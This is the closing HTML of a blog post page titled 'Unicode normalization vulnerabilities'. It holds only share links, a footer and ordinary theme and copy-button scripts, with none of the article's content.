        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2flazarpostenje.github.io%2fposts%2funicode-normalization-vulnerabilities%2f&amp;title=Unicode%20normalization%20vulnerabilities&amp;summary=Unicode%20normalization%20vulnerabilities&amp;source=https%3a%2f%2flazarpostenje.github.io%2fposts%2funicode-normalization-vulnerabilities%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Unicode normalization vulnerabilities on reddit"
        href="https://reddit.com/submit?url=https%3a%2f%2flazarpostenje.github.io%2fposts%2funicode-normalization-vulnerabilities%2f&title=Unicode%20normalization%20vulnerabilities">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Unicode normalization vulnerabilities on facebook"
        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2flazarpostenje.github.io%2fposts%2funicode-normalization-vulnerabilities%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Unicode normalization vulnerabilities on whatsapp"
        href="https://api.whatsapp.com/send?text=Unicode%20normalization%20vulnerabilities%20-%20https%3a%2f%2flazarpostenje.github.io%2fposts%2funicode-normalization-vulnerabilities%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Unicode normalization vulnerabilities on telegram"
        href="https://telegram.me/share/url?text=Unicode%20normalization%20vulnerabilities&amp;url=https%3a%2f%2flazarpostenje.github.io%2fposts%2funicode-normalization-vulnerabilities%2f">
        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
            <path
                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
        </svg>
    </a>
</div>

  </footer>
</article>
    </main>
    <footer class="footer">
    <span>&copy; 2021 <a href="https://lazarpostenje.github.io">Lazar</a></span>
    <span>
        
        
       | All rights reserved.
        
        
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
    <button class="top-link" id="top-link" type="button" accesskey="g">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
            <path style='color:palevioletred;' d="M12 6H0l6-6z" />
        </svg>
    </button>
</a>

<script>
    let menu = document.getElementById('menu')
    menu.scrollLeft = localStorage.getItem("menu-scroll-position");
    menu.onscroll = function () {
        localStorage.setItem("menu-scroll-position", menu.scrollLeft);
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerText = 'copy';

        function copyingDone() {
            copybutton.innerText = 'copied!';
            setTimeout(() => {
                copybutton.innerText = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
